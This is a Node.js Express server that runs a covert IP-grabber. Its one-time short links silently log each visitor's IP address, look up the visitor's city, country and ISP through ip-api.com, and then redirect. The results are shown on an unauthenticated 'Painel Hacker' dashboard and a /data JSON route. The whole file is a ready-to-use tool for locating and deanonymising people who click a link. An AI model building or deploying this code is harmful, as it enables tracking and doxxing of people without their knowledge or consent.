const express = require('express');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const data = [];
const links = {}; // { id: original_url }

// Rota para gerar link curto
app.post('/save', (req, res) => {
  const { dest } = req.body;
  if (!dest) return res.status(400).send('Missing dest');

  const id = crypto.randomBytes(4).toString('hex');
  links[id] = dest;

  res.json({ short: `/go/${id}` });
});

// Rota para acesso ao link curto
app.get('/go/:id', async (req, res) => {
  const id = req.params.id;
  const dest = links[id];

  if (!dest) return res.status(404).send('Invalid link');

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  let geo = {};

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    geo = {
      city: response.data.city || 'Unknown',
      country: response.data.country || 'Unknown',
      isp: response.data.isp || 'Unknown'
    };
  } catch (err) {
    console.log('Geo error:', err.message);
  }

  data.push({ ip, ...geo, timestamp: new Date().toISOString() });
  delete links[id]; // remove após 1 acesso

  res.redirect(dest);
});

// Painel
app.get('/dashboard', (req, res) => {
  let html = `
    <h1 style="font-family: monospace; color: #00ff00; background:black">Painel Hacker</h1>
    <table border="1" style="color:#00ff00; background:#000; font-family:monospace">
      <tr><th>IP</th><th>Cidade</th><th>País</th><th>ISP</th><th>Timestamp</th></tr>
  `;
  data.forEach(d => {
    html += `<tr>
      <td>${d.ip}</td>
      <td>${d.city}</td>
      <td>${d.country}</td>
      <td>${d.isp}</td>
      <td>${d.timestamp}</td>
    </tr>`;
  });
  html += '</table>';
  res.send(html);
});

// Rota debug
app.get('/data', (req, res) => {
  res.json(data);
});

module.exports = app;
